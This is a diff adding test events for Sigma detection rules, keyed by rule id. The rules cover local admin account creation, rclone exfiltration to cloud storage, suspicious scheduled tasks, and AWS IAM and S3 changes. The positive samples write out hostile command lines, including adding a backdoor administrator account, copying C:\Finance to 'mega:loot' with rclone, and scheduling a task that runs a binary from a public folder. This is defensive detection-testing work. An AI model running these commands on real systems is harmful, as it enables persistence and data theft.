@@ -1,0 +1,35 @@
+# Test events for the Sigma rules, keyed by the Sigma rule id. Events are OCSF, as the OCSF pack
+# emits them (dotted keys are expanded). Every rule needs at least one pos and one neg event:
+# the compiler refuses to publish a rule whose tests fail.
+1b3ed0b7-6db1-40ef-a634-ff113c7a269b:  # Local Account Created and Added to Administrators
+  pos:
+    - {activity_id: 1, metadata.product.vendor_name: Microsoft, process.file.path: 'C:\Windows\System32\net.exe', process.cmd_line: 'net user svc_backup P@ssw0rd! /add'}
+    - {activity_id: 1, metadata.product.vendor_name: Microsoft, process.file.path: 'C:\Windows\System32\net1.exe', process.cmd_line: 'net1 localgroup administrators svc_backup /add'}
+  neg:
+    - {activity_id: 1, metadata.product.vendor_name: Microsoft, process.file.path: 'C:\Windows\System32\net.exe', process.cmd_line: 'net user a.jansen /domain'}
+
+a5b5c7b1-3a33-4711-87d5-3c0e1d9b2775:  # Rclone Copy or Sync to a Cloud Storage Remote
+  pos:
+    - {activity_id: 1, metadata.product.vendor_name: Microsoft, process.file.path: 'C:\Users\Public\rclone.exe', process.cmd_line: 'rclone.exe copy C:\Finance mega:loot --transfers 16', process.parent_process.file.path: 'C:\Windows\System32\cmd.exe'}
+  neg:
+    - {activity_id: 1, metadata.product.vendor_name: Microsoft, process.file.path: 'C:\Program Files\rclone\rclone.exe', process.cmd_line: 'rclone.exe sync D:\Backups s3:corp-backups', process.parent_process.file.path: 'C:\Program Files\Backup\backupagent.exe'}
+    - {activity_id: 1, metadata.product.vendor_name: Microsoft, process.file.path: 'C:\Program Files\rclone\rclone.exe', process.cmd_line: 'rclone.exe version'}
+
+560a0944-263f-49e1-8d98-942528a968d5:  # Scheduled Task Created That Runs From a User-Writable Path
+  pos:
+    - {activity_id: 1, metadata.product.vendor_name: Microsoft, process.file.path: 'C:\Windows\System32\schtasks.exe', process.cmd_line: 'schtasks /create /sc minute /mo 15 /tn Updater /tr C:\Users\Public\upd.exe'}
+  neg:
+    - {activity_id: 1, metadata.product.vendor_name: Microsoft, process.file.path: 'C:\Windows\System32\schtasks.exe', process.cmd_line: 'schtasks /query /fo LIST'}
+
+90b73231-5663-46ec-aa2a-5742e4538c1f:  # IAM Access Key Created
+  pos:
+    - {cloud.provider: AWS, api.service.name: iam.amazonaws.com, api.operation: CreateAccessKey, unmapped.userIdentity.arn: 'arn:aws:iam::111122223333:user/dev-jan'}
+  neg:
+    - {cloud.provider: AWS, api.service.name: iam.amazonaws.com, api.operation: CreateAccessKey, unmapped.userIdentity.arn: 'arn:aws:sts::111122223333:assumed-role/key-rotation/lambda'}
+    - {cloud.provider: AWS, api.service.name: iam.amazonaws.com, api.operation: ListAccessKeys, unmapped.userIdentity.arn: 'arn:aws:iam::111122223333:user/dev-jan'}
+
+7ef3162a-e302-4017-954d-dc45292844dd:  # S3 Public Access Block Removed
+  pos:
+    - {cloud.provider: AWS, api.service.name: s3.amazonaws.com, api.operation: DeleteBucketPublicAccessBlock}
+  neg:
+    - {cloud.provider: AWS, api.service.name: s3.amazonaws.com, api.operation: PutPublicAccessBlock}
